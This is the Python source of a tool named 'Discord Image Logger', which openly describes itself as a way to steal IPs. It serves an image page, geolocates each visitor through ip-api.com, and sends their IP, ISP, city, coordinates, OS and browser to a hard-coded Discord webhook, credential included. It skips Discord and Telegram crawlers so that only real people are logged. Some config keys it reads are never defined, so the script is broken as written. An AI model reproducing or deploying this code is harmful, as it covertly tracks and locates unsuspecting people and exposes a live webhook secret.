import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

# إعدادات التطبيق
config = {
    "webhook": "https://discord.com/api/webhooks/1367441811920126033/RZh4nmxwd-wa5uflYh03hkIHoCjdrKEKL-e3xzzNZQIERZydwVEU7nE8GfisOJkYUJbu",
    "image": "https://images.sftcdn.net/images/t_app-cover-m,f_auto/p/9848e854-ffae-11e6-a59d-00163ed833e7/3489861693/discord-screenshot.png",  # يمكنك تعديل الصورة هنا
    "imageArgument": True,  # يسمح لك بتغيير الصورة من خلال رابط
    "username": "Image Logger",  # اسم المستخدم الذي سيظهر في الـ webhook
    "color": 0x00FFFF,  # اللون الذي سيظهر في الـ embed
    "vpnCheck": 1,  # تحقق من VPN
}

# قائمة IPs محظورة (اختياري)
blacklistedIPs = ("27", "104", "143", "164")  

# التحقق من الـ IP إذا كان بوت أو لا
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

# إضافة تقرير عند حدوث خطأ
def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

# إضافة تقرير عند فتح الصورة
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`

**PC Info:**
> **OS:** `{httpagentparser.simple_detect(useragent)[0]}`
> **Browser:** `{httpagentparser.simple_detect(useragent)[1]}`

**User Agent:**

"""
            }
        ],
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    requests.post(config["webhook"], json = embed)
    return info

# إعداد الخادم للتعامل مع الطلبات
class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # تحديد الصورة
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if dic.get("url") or dic.get("id"):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]

            # إنشاء بيانات الصفحة
            data = f'''<style>body {{
                margin: 0;
                padding: 0;
            }}
            div.img {{
                background-image: url('{url}');
                background-position: center center;
                background-repeat: no-repeat;
                background-size: contain;
                width: 100vw;
                height: 100vh;
            }}</style><div class="img"></div>'''.encode()

            # التحقق من IP إذا كان محظور
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            # التحقق من البوتات
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'))  # صورة التحميل
                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                return
            
            # إنشاء التقرير
            result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
            
            # إرسال الرسالة
            message = config["message"]["message"]
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                message = message.replace("{isp}", result["isp"])
                message = message.replace("{asn}", result["as"])
                message = message.replace("{country}", result["country"])
                message = message.replace("{region}", result["regionName"])
                message = message.replace("{city}", result["city"])
                message = message.replace("{lat}", str(result["lat"]))
                message = message.replace("{long}", str(result["lon"]))
                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                message = message.replace("{mobile}", str(result["mobile"]))
                message = message.replace("{vpn}", str(result["proxy"]))
                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

            datatype = 'text/html'
            if config["message"]["doMessage"]:
                data = message.encode()

            # إرسال البيانات
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

# تشغيل الخادم
def run(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd server on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
